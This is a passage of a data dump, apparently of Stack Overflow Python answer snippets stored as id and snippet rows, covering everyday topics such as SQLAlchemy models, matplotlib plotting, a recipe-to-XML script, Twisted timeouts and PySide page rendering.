</snippet></ROW><ROW><id>11912764</id><snippet>a[:]</snippet></ROW><ROW><id>11912838</id><snippet>ShowModal</snippet></ROW><ROW><id>11912838</id><snippet>user = wx.TextEntryDialog(None, "Login", "Username", "")
if user.ShowModal() == wx.ID_OK:
    print 'here'   
    password = wx.TextEntryDialog(None, "Password", "Password", "")
    if password.ShowModal() == wx.ID_OK:   
        print 'there'
</snippet></ROW><ROW><id>11912838</id><snippet>destroy</snippet></ROW><ROW><id>11912899</id><snippet>import json
import urlparse

json.dumps(urlparse.parse_qs("a=1&amp;b=2"))
</snippet></ROW><ROW><id>11912899</id><snippet>'{"a": ["1"], "b": ["2"]}'
</snippet></ROW><ROW><id>11912899</id><snippet>{"a":1, "b":2}</snippet></ROW><ROW><id>11913019</id><snippet>pyramid_tm</snippet></ROW><ROW><id>11913019</id><snippet>zope.sqlalchemy</snippet></ROW><ROW><id>11913019</id><snippet>from sqlalchemy import engine_from_config

from .models import DBSession

def main(global_config, **settings):
    """This function returns a Pyramid WSGI application."""

    engine = engine_from_config(settings, 'sqlalchemy.')
    DBSession.configure(bind=engine)
    # Configuration setup
</snippet></ROW><ROW><id>11913019</id><snippet>.ini</snippet></ROW><ROW><id>11913019</id><snippet>models.py</snippet></ROW><ROW><id>11913019</id><snippet>from sqlalchemy.ext.declarative import declarative_base

from sqlalchemy.orm import (
    scoped_session,
    sessionmaker,
    )

from zope.sqlalchemy import ZopeTransactionExtension

DBSession = scoped_session(sessionmaker(extension=ZopeTransactionExtension()))
Base = declarative_base()

class YourModel(Base):
    # Define your model
</snippet></ROW><ROW><id>11913019</id><snippet>scoped_session</snippet></ROW><ROW><id>11913019</id><snippet>DBSession</snippet></ROW><ROW><id>11913019</id><snippet>from pyramid.view import view_config
from .models import (
    DBSession,
    YourModel,
    )

@view_config(...)
def aview(request):
    result = DBSession.query(YourModel).filter(...).first()
</snippet></ROW><ROW><id>11913384</id><snippet>&gt;&gt;&gt; import boto.sqs
&gt;&gt;&gt; c = boto.sqs.connect_to_region()
&gt;&gt;&gt; q = c.lookup('myqueue')
&gt;&gt;&gt; messages = c.receive_message(q, num_messages=1, attributes='All')
&gt;&gt;&gt; messages[0].attributes
{u'ApproximateFirstReceiveTimestamp': u'1365474374620',
 u'ApproximateReceiveCount': u'2',
 u'SenderId': u'419278470775',
 u'SentTimestamp': u'1365474360357'}
&gt;&gt;&gt;
</snippet></ROW><ROW><id>11913695</id><snippet>train_set</snippet></ROW><ROW><id>11913695</id><snippet>test_set</snippet></ROW><ROW><id>11913695</id><snippet>train_set = ["The sky is blue.", "The sun is bright."] #Documents
test_set = ["The sun in the sky is bright."] #Query
</snippet></ROW><ROW><id>11913839</id><snippet>'''</snippet></ROW><ROW><id>11913839</id><snippet>r</snippet></ROW><ROW><id>11913839</id><snippet>\n</snippet></ROW><ROW><id>11913839</id><snippet>&gt;&gt;&gt; """Line one
... Line two"""
'Line one\nLine two'
</snippet></ROW><ROW><id>11913839</id><snippet>LOREM_IPSUM = """\
Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
"""
</snippet></ROW><ROW><id>11913839</id><snippet>__doc__</snippet></ROW><ROW><id>11913919</id><snippet>x = raw_input("Enter string of length 7 to generate your scrabble helper: ")
p = re.compile('|'.join((c for c in x)))
</snippet></ROW><ROW><id>11914016</id><snippet>and line</snippet></ROW><ROW><id>11914016</id><snippet>if step == 1 and line:</snippet></ROW><ROW><id>11914016</id><snippet>line</snippet></ROW><ROW><id>11914016</id><snippet>category=''
step=0

menu = open("menuTextFormat.txt", 'r')
xml = open('menuTextXML.txt', 'w')

xml.write("&lt;recipe&gt;\n")

while 1:
    line = menu.readline()
    if not line:
        break

    #after checking for EOF, remove \n
    line = line.rstrip()

    #category
    if ":" in line:
        #set category as next line
        category = menu.readline().rstrip()
        step=1
        continue

    #name &amp; servings
    if step == 1 and line:
        #write category
        xml.write("\t&lt;category&gt;\n\t\t" + category + "\n\t&lt;/category&gt;\n")
        #write name
        xml.write("\t&lt;name&gt;\n\t\t" + line + "\n\t&lt;/name&gt;\n")

        #check for serving size
        servings = menu.readline().rstrip()
        if not servings:
            xml.write("\t&lt;servings&gt;\n\t\tno serving size listed\n\t&lt;/servings&gt;\n")
        else:
            xml.write("\t&lt;servings&gt;\n\t\t" + servings + "\n\t&lt;/servings&gt;\n")

        step=2
        continue

    #ingredients
    if step == 2 and line:
        #write first ingredient, then loop for rest
        xml.write("\t&lt;qty&gt;\n\t\t" + line + "\n\t&lt;/qty&gt;\n")
        xml.write("\t&lt;ingredient&gt;\n\t\t" + menu.readline().rstrip() + "\n\t&lt;/ingredient&gt;\n")

        #loop for incredients
        while 1:
            qty = menu.readline().rstrip()
            #no more incredients, break loop
            if not qty:
                break

            xml.write("\t&lt;qty&gt;\n\t\t" + qty + "\n\t&lt;/qty&gt;\n")
            xml.write("\t&lt;ingredient&gt;\n\t\t" + menu.readline().rstrip() + "\n\t&lt;/ingredient&gt;\n")

        step=3
        continue

    #procedure
    if step == 3 and line:
        #write first step, then loop for rest
        xml.write("\t&lt;procedure&gt;\n")
        xml.write("\t\t&lt;step&gt;\n\t\t\t" + line + "\n\t\t&lt;/step&gt;\n")

        #loop for steps
        while 1:
            step = menu.readline().rstrip()
            #no more steps, break loop
            if not step:
                break

            xml.write("\t\t&lt;step&gt;\n\t\t\t" + step + "\n\t\t&lt;/step&gt;\n")

        xml.write("\t&lt;/procedure&gt;\n")

        step=1
        continue

xml.write("&lt;/recipe&gt;")
menu.close()
xml.close()
</snippet></ROW><ROW><id>11914016</id><snippet>&lt;recipe&gt;
    &lt;category&gt;
        Breakfast Breads
    &lt;/category&gt;
    &lt;name&gt;
        Gluten Free Nut Loaf
    &lt;/name&gt;
    &lt;servings&gt;
        Makes 1 loaf
    &lt;/servings&gt;
    &lt;qty&gt;
        150 g (51/2 oz./11/2 cups)
    &lt;/qty&gt;
    &lt;ingredient&gt;
        almond meal
    &lt;/ingredient&gt;
    &lt;qty&gt;
        30 g (1 oz./1/4 cup)
    &lt;/qty&gt;
    &lt;ingredient&gt;
        walnuts, coarsely chopped
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1/4 teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        gluten-free baking powder
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1 teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        ground cinnamon
    &lt;/ingredient&gt;
    &lt;qty&gt;
        95 g (31/4 oz./3/4 cup)
    &lt;/qty&gt;
    &lt;ingredient&gt;
        arrowroot (tapioca) flour
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1/2 teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        sea salt
    &lt;/ingredient&gt;
    &lt;qty&gt;
        3
    &lt;/qty&gt;
    &lt;ingredient&gt;
        organic eggs
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1/2 teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        stevia powder
    &lt;/ingredient&gt;
    &lt;qty&gt;
        3 tablespoons
    &lt;/qty&gt;
    &lt;ingredient&gt;
        grape seed oil
    &lt;/ingredient&gt;
    &lt;qty&gt;
        2 tablespoons
    &lt;/qty&gt;
    &lt;ingredient&gt;
        coconut Milk
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1 teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        apple cider vinegar
    &lt;/ingredient&gt;
    &lt;procedure&gt;
        &lt;step&gt;
            Preheat the oven to 180∫C (350∫F/Gas 4).
        &lt;/step&gt;
        &lt;step&gt;
            Grease a 20 x 9 cm (8 x 31/2 inch) loaf (bar) tin.
        &lt;/step&gt;
        &lt;step&gt;
            Put the almond meal, walnuts, baking powder, cinnamon, arrowroot flour and salt in a large bowl and mix well with a wooden spoon.
        &lt;/step&gt;
        &lt;step&gt;
            Crack the eggs into a separate bowl and whisk using an electric mixer until pale and fluffy, about 11/2 minutes.
        &lt;/step&gt;
        &lt;step&gt;
            Add the stevia, grape seed oil, coconut milk and vinegar and mix gently.
        &lt;/step&gt;
        &lt;step&gt;
            Pour the mixture into the dry ingredients and stir to combine.
        &lt;/step&gt;
        &lt;step&gt;
            Spoon the mixture into the greased tin and bake for about 40 minutes, or until a skewer inserted in the centre of the loaf comes out clean.
        &lt;/step&gt;
        &lt;step&gt;
            Remove the bread from the oven and leave to cool in the tin for a few minutes, before turning out onto a wire rack to cool completely.
        &lt;/step&gt;
        &lt;step&gt;
            Enjoy the bread melt-in-the-mouth warm, or at room temperature with your favourite topping.
        &lt;/step&gt;
    &lt;/procedure&gt;
    &lt;category&gt;
        Breakfast Breads
    &lt;/category&gt;
    &lt;name&gt;
        Basic Gluten Free Loaf
    &lt;/name&gt;
    &lt;servings&gt;
        no serving size listed
    &lt;/servings&gt;
    &lt;qty&gt;
        2Ω cups
    &lt;/qty&gt;
    &lt;ingredient&gt;
        blanched almond flour
    &lt;/ingredient&gt;
    &lt;qty&gt;
        Ω teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        baking soda
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1 tsp.
    &lt;/qty&gt;
    &lt;ingredient&gt;
        bicarbonate of soda
    &lt;/ingredient&gt;
    &lt;qty&gt;
        3
    &lt;/qty&gt;
    &lt;ingredient&gt;
        eggs beaten
    &lt;/ingredient&gt;
    &lt;qty&gt;
        1 tsp.
    &lt;/qty&gt;
    &lt;ingredient&gt;
        stevia powder
    &lt;/ingredient&gt;
    &lt;qty&gt;
        Ω teaspoon
    &lt;/qty&gt;
    &lt;ingredient&gt;
        apple cider vinegar
    &lt;/ingredient&gt;
    &lt;qty&gt;
        !!
    &lt;/qty&gt;
    &lt;ingredient&gt;
        Pinch sea salt
    &lt;/ingredient&gt;
    &lt;procedure&gt;
        &lt;step&gt;
            Preheat oven to 250 degrees Celsius
        &lt;/step&gt;
        &lt;step&gt;
            Grease a small loaf pan
        &lt;/step&gt;
        &lt;step&gt;
            Combine dry ingredients in a bowl
        &lt;/step&gt;
        &lt;step&gt;
            In a separate bowl place eggs and apple cider vinegar
        &lt;/step&gt;
        &lt;step&gt;
            Spoon the mixture into loaf pan
        &lt;/step&gt;
        &lt;step&gt;
            Bake for 50 mins until set
        &lt;/step&gt;
        &lt;step&gt;
            Cool on wire rack
        &lt;/step&gt;
        &lt;step&gt;
            Slice when cool
        &lt;/step&gt;
    &lt;/procedure&gt;
&lt;/recipe&gt;
</snippet></ROW><ROW><id>11914020</id><snippet>try..except</snippet></ROW><ROW><id>11914020</id><snippet>try:
    site = opener.open(url)  # line 58 in cart-pickup.py
except IOError: 
    print "Error: Site not loading or it isnt UP. Retrying..." 
    # return site # This will cause a NameError if site is not defined.
    return url    # Perhaps you meant this?
except httplib.BadStatusLine:
    # log opening `url` did not succeed, or
    # queue it to be tried again, etc.
    pass
</snippet></ROW><ROW><id>11914123</id><snippet>setp(stemlines, 'color', 'b')
</snippet></ROW><ROW><id>11914123</id><snippet>&gt;&gt;&gt; setp(stemlines, 'linewidth', 2, 'color', 'r')  # MATLAB style

&gt;&gt;&gt; setp(stemlines, linewidth=2, color='r')       # python style
</snippet></ROW><ROW><id>11914123</id><snippet>for line in stemlines:
     line.set_color('r') 
</snippet></ROW><ROW><id>11914127</id><snippet>Deferred.addErrback</snippet></ROW><ROW><id>11914130</id><snippet>fp = open(filename, 'rb', encoding='utf-8')
</snippet></ROW><ROW><id>11914150</id><snippet>f = input("Please enter a number: ")
try:
    f=int(f)
    print("That's good")
except ValueError:
    print("That isn't a number.")
</snippet></ROW><ROW><id>11914150</id><snippet>f = input("Please enter a number: ")
if f.isdigit():
    print("That's good")
else:
    print("That isn't a number.")
</snippet></ROW><ROW><id>11914159</id><snippet>reactor.callLater</snippet></ROW><ROW><id>11914159</id><snippet>twisted.protocols.policies.TimeoutMixin</snippet></ROW><ROW><id>11914159</id><snippet>setTcpKeepAlive</snippet></ROW><ROW><id>11914231</id><snippet>C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Bookmarks
</snippet></ROW><ROW><id>11914231</id><snippet>~/.config/chrome/Default/Bookmarks
</snippet></ROW><ROW><id>11914381</id><snippet>.format</snippet></ROW><ROW><id>11914381</id><snippet>%</snippet></ROW><ROW><id>11914381</id><snippet>item = normal_array[i]
'vn %.15f %.15f %.15f\n' % (item.x, item.y, item.z)
</snippet></ROW><ROW><id>11914381</id><snippet>for item in normal_array:
    'vn %.15f %.15f %.15f\n' % (item.x, item.y, item.z)
</snippet></ROW><ROW><id>11914381</id><snippet>def gen_data(n):
    l = []
    for k in xrange(n):
        l.append(collections.namedtuple('normal', ('x', 'y', 'z'))(random.random(), random.random(), random.random()))
    return l

if __name__ == '__main__':
    times = 1000
    print 'format:'
    print timeit.Timer('for i in xrange(len(normal_array)):\n    str = "vn {0:.15f} {1:.15f} {2:.15f}\\n".format(normal_array[i].x, normal_array[i].y, normal_array[i].z)\n',
            'from __main__ import gen_data; normal_array = gen_data(1000)').timeit(times)
    print '%s:'
    print timeit.Timer('for i in xrange(len(normal_array)):\n    str = "vn %.15f %.15f %.15f\\n".format(normal_array[i].x, normal_array[i].y, normal_array[i].z)\n',
            'from __main__ import gen_data; normal_array = gen_data(1000)').timeit(times)
    print '%s+iteration:'
    print timeit.Timer('for o in normal_array:\n    str = "vn %.15f %.15f %.15f\\n".format(o.x, o.y, o.z)\n',
            'from __main__ import gen_data; normal_array = gen_data(1000)').timeit(times)
</snippet></ROW><ROW><id>11914381</id><snippet>format:
5.34718108177
%s:
1.30601406097
%s+iteration:
1.23484301567
</snippet></ROW><ROW><id>11914589</id><snippet>def open_remote_recording():
    recording_doc_id, recording_id = tuple(request.args)
    url = get_doc_url(server = RECORDINGS_SERVER, database = RECORDINGS_DATABASE, doc_id = recording_doc_id, attachment = recording_id)
    content_type = 'audio/mp3'
    f = urllib.urlopen(url)
    return f

@auth.requires_login()
def recordings():
    f = open_remote_recording()
    return response.stream(f, chunk_size=4096)
</snippet></ROW><ROW><id>11914589</id><snippet>get_doc_url</snippet></ROW><ROW><id>11914902</id><snippet>__eq__</snippet></ROW><ROW><id>11914902</id><snippet>__hash__</snippet></ROW><ROW><id>11914902</id><snippet>set()</snippet></ROW><ROW><id>11914902</id><snippet>new_obj_list = list(set(obj_list))
</snippet></ROW><ROW><id>11914944</id><snippet>class A:
    v = 'a'

class B:
    v = 'b'

def C(x):
    class C(x): pass
    return C
x = A
print C(x).v
</snippet></ROW><ROW><id>11915090</id><snippet>&gt;&gt;&gt; def func(x,y,z,a=1,b=2,c=3):
    pass

&gt;&gt;&gt; func.func_code.co_varnames[-len(func.func_defaults):]
('a', 'b', 'c')
</snippet></ROW><ROW><id>11915133</id><snippet>self</snippet></ROW><ROW><id>11915133</id><snippet>class Mob(object):
    def __init__(self, pos, mob_positions):
        self.pos = pos
        mob_positions[self] = pos
</snippet></ROW><ROW><id>11915539</id><snippet>class Word(Base):
    __tablename__ = "words"

    id = Column(Integer, primary_key=True)
    eng = Column(String(32), unique=True)
    chinese = relationship("Chinese", backref="eng")

    def __init__(self, eng, chinese):
        self.eng = eng
        self.chinese = map(Chinese, chinese)

class Chinese(Base):
    __tablename__ = "chinese_words"

    word = Column(String(128), primary_key=True)
    eng_id = Column(Integer, ForeignKey('words.id'), primary_key=True)

    def __init__(self, word):
        self.word = word
</snippet></ROW><ROW><id>11915539</id><snippet>str()</snippet></ROW><ROW><id>11915539</id><snippet>eval()</snippet></ROW><ROW><id>11915539</id><snippet>chinese</snippet></ROW><ROW><id>11915539</id><snippet>json.dumps()</snippet></ROW><ROW><id>11915539</id><snippet>json.loads()</snippet></ROW><ROW><id>11915539</id><snippet>TypeDecorator</snippet></ROW><ROW><id>11915539</id><snippet>class Json(TypeDecorator):

    impl = String

    def process_bind_param(self, value, dialect):
        return json.dumps(value)

    def process_result_value(self, value, dialect):
        return json.loads(value)

class Word(Base):
    __tablename__ = "words"

    eng = Column(String(32), primary_key=True)
    chinese = Column(Json(128))
</snippet></ROW><ROW><id>11916163</id><snippet>try:
    print path
except:
    pass
try:
    print entry
except:
    pass  
</snippet></ROW><ROW><id>11916163</id><snippet>python -m pdb manage.py collectstatic
</snippet></ROW><ROW><id>11916223</id><snippet>QApplication</snippet></ROW><ROW><id>11916223</id><snippet>Render</snippet></ROW><ROW><id>11916223</id><snippet>import re
import sys
import time

# Tested with PySide 1.0.9, changing imports to PyQt should work identically
from PySide.QtCore import Qt, QUrl
from PySide.QtGui import QApplication, QImage, QPainter
from PySide.QtWebKit import QWebPage, QWebSettings


def os_safe_name(url):
    url = re.sub("[^a-zA-Z0-9_-]+", "_", url)
    url = re.sub("_{2,}", "_", url)
    return url


class Render(QWebPage):
    def __init__(self, url):
        QWebPage.__init__(self)

        self.url = url
        self.finished = False

        # Settings
        s = self.settings()
        #s.setAttribute(QWebSettings.AutoLoadImages, False)
        s.setAttribute(QWebSettings.JavascriptCanOpenWindows, False)
        s.setAttribute(QWebSettings.PluginsEnabled, True)

        #self.mainFrame().setScrollBarPolicy(Qt.Vertical, Qt.ScrollBarAlwaysOff)
        self.mainFrame().setScrollBarPolicy(Qt.Horizontal, Qt.ScrollBarAlwaysOff)

        # When page is loaded, callback saves image to file
        self.loadFinished.connect(self._loadFinished)

        self.mainFrame().load(QUrl(url))

    def _loadFinished(self, result):
        frame = self.mainFrame()
        size = frame.contentsSize()
        size.setWidth(1366)
        self.setViewportSize(size)

        image = QImage(self.viewportSize(), QImage.Format_ARGB32)

        painter = QPainter(image)
        frame.render(painter)
        painter.end()

        self.filepath = "output/%s.png" % os_safe_name(self.url)
        image.save(self.filepath)

        self.finished = True


def run(url, app = None):
    if app is None:
        app = QApplication(sys.argv)

    r = Render(url)

    while not r.finished:
        app.processEvents()
        time.sleep(0.01)

    return r.filepath


if __name__ == '__main__':
    app = QApplication(sys.argv)

    print run("http://stackoverflow.com", app=app)
    print run("http://google.com", app=app)
</snippet></ROW><ROW><id>11916309</id><snippet>import numpy as np
import matplotlib.pyplot as plt 

# plt.subplots instead of plt.subplot
# create a figure and two subplots side by side, they share the
# x and the y-axis
fig, axes = plt.subplots(ncols=2, sharey=True, sharex=True)
data = np.random.random([10, 2]) 
# np.r_ instead of lists
colors = np.r_[np.linspace(0.1, 1, 5), np.linspace(0.1, 1, 5)] 
mymap = plt.get_cmap("Reds")
# get the colors from the color map
my_colors = mymap(colors)
# here you give floats as color to scatter and a color map
# scatter "translates" this
axes[0].scatter(data[:, 0], data[:, 1], s=40,
                c=colors, edgecolors='None',
                cmap=mymap)
for n in range(5):
    # here you give a color to scatter
    axes[1].scatter(data[n, 0], data[n, 1], s=40,
                    color=my_colors[n], edgecolors='None',
                    label="point %d" %(n))
# by default legend would show multiple scatterpoints (as you would normally
# plot multiple points with scatter)
# I reduce the number to one here
plt.legend(scatterpoints=1)
plt.tight_layout()
plt.show()
</snippet></ROW><ROW><id>11916309</id><snippet>plt.plot</snippet></ROW><ROW><id>11916670</id><snippet>os.listdir</snippet></ROW><ROW><id>11916670</id><snippet>root = 'C:/Users/Any/Desktop/test'
for item in os.listdir(root):
    fullpath = os.path.join(root, item)
    os.rename(fullpath, fullpath.replace('E', 'e'))
</snippet></ROW><ROW><id>11916670</id><snippet>translate</snippet></ROW><ROW><id>11916670</id><snippet>maketrans</snippet></ROW><ROW><id>11916670</id><snippet>d = {'E': 'e', 'a': 'B', 'v': 'C'}
s = 'aAaAvVvVeEeE'
</snippet></ROW><ROW><id>11916670</id><snippet>for old, new in d.iteritems():
    s = s.replace(old, new)

print s
# BABACVCVeeee
</snippet></ROW><ROW><id>11916670</id><snippet>import string

old, new = zip(*d.items())
print old, new
# ('a', 'E', 'v') ('B', 'e', 'C')

old_str, new_str = ''.join(old), ''.join(new)
print old_str, new_str
# aEv BeC

table = string.maketrans(old_str, new_str)

print s.translate(table)
# BABACVCVeeee
</snippet></ROW><ROW><id>11916670</id><snippet>maketrans</snippet></ROW><ROW><id>11916900</id><snippet>import requests
import bs4     # the 'beautifulsoup4' module
import pickle

# find an 'all the countries' listing
url = "http://www.nationsonline.org/oneworld/countries_of_the_world.htm"
r   = requests.get(url)
bs  = bs4.BeautifulSoup(r.text)

# grab all table rows
rows = [
    [cell.text.strip() for cell in row.findAll('td')]
    for row in bs.findAll('tr')
]
# filter for just the rows containing country-name data
rows = [row[1:] for row in rows if len(row) == 4]

# create a look-up table
country = {}
for en,fr,lo in rows:
    country[en] = en
    country[fr] = en
    country[lo] = en

# and store it for later use
with open('country.dat', 'wb') as outf:
    pickle.dump(country, outf)
</snippet></ROW><ROW><id>11916900</id><snippet>import difflib

def possible_countries(c):
    res = difflib.get_close_matches(c, country.keys(), cutoff=0.5)
    return sorted(set(country[r] for r in res))
</snippet></ROW><ROW><id>11916900</id><snippet>import sys
import pickle
import csv

def main(csvfname):
    # get existing country data
    with open('country.dat', 'rb') as inf:
        country = pickle.load(inf)

    # get unique country names from your csv file
    with open(csvfname, 'rb') as inf:
        data = sorted(set(row[0] for row in csv.reader(inf)))

    for c in data:
        if c not in country:
            print('"{}" not found'.format(c))
            sugg = possible_countries(c)
            if sugg:
                print('Suggested replacements:\n  {}'.format('\n  '.join(sugg)))
            else:
                print('(no suggestions)')
            repl = raw_input('Enter replacement value (or &lt;Enter&gt; for none): ').strip()
            if repl:
                country[c] = repl

    # re-save country data
    with open('country.dat', 'wb') as outf:
        pickle.dump(country, outf)

if __name__=="__main__":
    if len(sys.argv) == 2:
        main(sys.argv[1])
    else:
        print('Usage: python fix_countries.py csvfname')
</snippet></ROW><ROW><id>11917093</id><snippet>&gt;&gt;&gt; 'no quotes'
'no quotes'
&gt;&gt;&gt; 'one quote: \''
"one quote: '"
</snippet></ROW><ROW><id>11917093</id><snippet>&gt;&gt;&gt; 'two quotes: \'\"'
'two quotes: \'"'
</snippet></ROW><ROW><id>11917174</id><snippet>win.show_all()
#win.window.input_shape_combine_mask(img,0,0)
def set_mask(win):
    #b=gtk.gdk.bitmap_create_from_data(win.window,8,win.window.get_size())
    size=win.window.get_size()
    print size
    bitmap=gtk.gdk.Pixmap(win.window,size[0],size[1],1)

    cr = bitmap.cairo_create()
    cr.set_operator(cairo.OPERATOR_SOURCE)
    cr.set_source_rgba(0.0,0.0,0.0,0.0)
    cr.rectangle((0,0)+size)
    cr.fill()  

    win.window.input_shape_combine_mask(bitmap,0,0)
    print 'ready'
gobject.timeout_add(5000, set_mask, win)
</snippet></ROW><ROW><id>11917231</id><snippet>include_entities</snippet></ROW><ROW><id>11917231</id><snippet>t.co</snippet></ROW><ROW><id>11917231</id><snippet>for status in tweepy.Cursor(status.user_timeline, id=user, include_entities=True).items(20): 
    for url in status.entities['urls']:
         print url['expanded_url']
</snippet></ROW><ROW><id>11917261</id><snippet>__init__()</snippet></ROW><ROW><id>11917261</id><snippet>@orm.reconstructor</snippet></ROW><ROW><id>11917261</id><snippet>from sqlalchemy import orm

class MyMappedClass(object):
    def __init__(self, data):
        self.data = data
        # we need stuff on all instances, but not in the database.
        self.stuff = []

    @orm.reconstructor
    def init_on_load(self):
        self.stuff = []
</snippet></ROW><ROW><id>11917403</id><snippet>host=</snippet></ROW><ROW><id>11917403</id><snippet>connect</snippet></ROW><ROW><id>11917403</id><snippet>from mongoengine import *
connect('tablename', host="mongodb://&lt;user&gt;:&lt;password&gt;@ds035617.mongolab.com:35617/&lt;mydatabase&gt;")
</snippet></ROW><ROW><id>11917422</id><snippet>inline callbacks</snippet></ROW><ROW><id>11917422</id><snippet>gen</snippet></ROW><ROW><id>11917422</id><snippet>self.render</snippet></ROW><ROW><id>11917422</id><snippet>  response = []
  @tornado.web.asynchronous
  def get(self):
      self.render('head.html')
      http_client = AsyncHTTPClient()

      http_client.fetch("http://google.com",
                        callback=self.mywrite)

      http_client.fetch("http://python.org",
                        callback=self.mywrite)

      http_client.fetch("http://tornadoweb.org",
                        callback=self.mywrite)

      self.render('footer.html')
      self.finish()


  def mywrite(self, result):
      self.render('body_part.html')
      self.response.add(result)
      if len(self.response) == 3:
        do_something_with_response(self.response)
</snippet></ROW><ROW><id>11917469</id><snippet>self</snippet></ROW><ROW><id>11917469</id><snippet>initStuff</snippet></ROW><ROW><id>11917972</id><snippet>def method(req):
    req.content_type = 'text/xml'
    req.write('&lt;items&gt;&lt;item&gt;1&lt;/item&gt;&lt;item&gt;2&lt;/item&gt;&lt;/items&gt;')
</snippet></ROW><ROW><id>11918056</id><snippet>*END*THE SMALL PRINT!
</snippet></ROW><ROW><id>11918056</id><snippet>skip_gutenberg_header</snippet></ROW><ROW><id>11918056</id><snippet>Header info
*END*THE SMALL PRINT!

He was very clever, be it sweetness or be angry, ashamed or only amused, at such a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself.
</snippet></ROW><ROW><id>11918056</id><snippet>a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. at such a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. cannot make speeches, Emma:" he soon cut it all himself. be it sweetness or be angry, ashamed or only amused, at such a stroke. She had never thought of
</snippet></ROW><ROW><id>11918066</id><snippet>import matplotlib.pyplot as plt
import numpy as np

data = np.random.rand(5, 4)
heatmap = plt.pcolor(data)

for y in range(data.shape[0]):
    for x in range(data.shape[1]):
        plt.text(x + 0.5, y + 0.5, '%.4f' % data[y, x],
                 horizontalalignment='center',
                 verticalalignment='center',
                 )

plt.colorbar(heatmap)

plt.show()
</snippet></ROW><ROW><id>11918151</id><snippet>&lt;!doctype html&gt;</snippet></ROW><ROW><id>11918151</id><snippet>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</snippet></ROW><ROW><id>11918151</id><snippet>lxml.html.fromstring()</snippet></ROW><ROW><id>11918151</id><snippet>application/xhtml+xml</snippet></ROW><ROW><id>11918151</id><snippet>application/xml</snippet></ROW><ROW><id>11918151</id><snippet>text/html</snippet></ROW><ROW><id>11918227</id><snippet>int (**f_is)(int n);

//...

int xs[10];

//...

while(true) {
    int i = 0;

    int cmin = f_is[0](i);
    int cminIndex = 0;

    for(i = 1; i &lt; 10; ++i) {
        int cfunc = (f_is[i])(i);

        if(cmin &lt; cfunc) {
            cmin = cfunc;
            cminIndex = i;
        }
    }

    ++xs[cminIndex];
}
</snippet></ROW><ROW><id>11918366</id><snippet>time.struct_time</snippet></ROW><ROW><id>11918366</id><snippet>int</snippet></ROW><ROW><id>11918366</id><snippet>time.struct_time</snippet></ROW><ROW><id>11918366</id><snippet>time.mktime</snippet></ROW><ROW><id>11918366</id><snippet>calendar.timegm</snippet></ROW><ROW><id>11918366</id><snippet>time</snippet></ROW><ROW><id>11918435</id><snippet>visit()</snippet></ROW><ROW><id>11918435</id><snippet>URLError</snippet></ROW><ROW><id>11918435</id><snippet>find_all()</snippet></ROW><ROW><id>11918435</id><snippet>self.links = self.visit(*args, **kwargs)
if not isinstance(self.links, urllib.error.URLError):
    self.links = self.links.find_all('a')
else:
    # Do something with an HTTP Error
</snippet></ROW><ROW><id>11918435</id><snippet>get_links()</snippet></ROW><ROW><id>11918435</id><snippet>visit()</snippet></ROW><ROW><id>11918435</id><snippet>get_links()</snippet></ROW><ROW><id>11918435</id><snippet>return error
</snippet></ROW><ROW><id>11918435</id><snippet>raise error
</snippet></ROW><ROW><id>11918435</id><snippet>visit()</snippet></ROW><ROW><id>11918516</id><snippet>print file
</snippet></ROW><ROW><id>11918516</id><snippet>from os import getcwd
print 'Current directory:', getcwd()
</snippet></ROW><ROW><id>11918818</id><snippet>python setup.py build_ext -I/opt/adns/include -L/opt/adns/lib -R/opt/adns/lib
</snippet></ROW><ROW><id>11918818</id><snippet>python setup.py install
</snippet></ROW><ROW><id>11918818</id><snippet>setup.cfg</snippet></ROW><ROW><id>11918818</id><snippet>[build_ext]
include_dirs=/opt/adns/include
library_dirs=/opt/adns/lib
rpath=/opt/adns/lib
</snippet></ROW><ROW><id>11918835</id><snippet>App Engine interactive console for qtrack-dev
&gt;&gt;&gt; from google.appengine.api import conversion
&gt;&gt;&gt; asset = conversion.Asset("text/html", "&lt;b&gt;some data&lt;/b&gt;", "test.html")
&gt;&gt;&gt; conversion_obj = conversion.Conversion(asset, "image/png")
&gt;&gt;&gt; result = conversion.convert(conversion_obj)
Username:XXXXXg@gmail.com
Password:
&gt;&gt;&gt; result.assets
[&lt;google.appengine.api.conversion.conversion.Asset object at 0x9e4642c&gt;]

&gt;&gt;&gt; open('/tmp/x.png','w').write(result.assets[0].data)
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11919071</id><snippet>from sqlalchemy import select
from sqlalchemy.sql import and_

results = select([orm_obj.c.poi_id, orm_obj.c.poi_name])\
    .where(and_(orm_obj.c.id &gt; 1, orm_obj.c.id &lt; 100)).execute()
for id, name in results:
    print id, name
</snippet></ROW><ROW><id>11919074</id><snippet>curses</snippet></ROW><ROW><id>11919074</id><snippet>termios</snippet></ROW><ROW><id>11919074</id><snippet>curses</snippet></ROW><ROW><id>11919074</id><snippet>termios</snippet></ROW><ROW><id>11919074</id><snippet>#!/usr/bin/env python
import sys
import termios
import contextlib


@contextlib.contextmanager
def raw_mode(file):
    old_attrs = termios.tcgetattr(file.fileno())
    new_attrs = old_attrs[:]
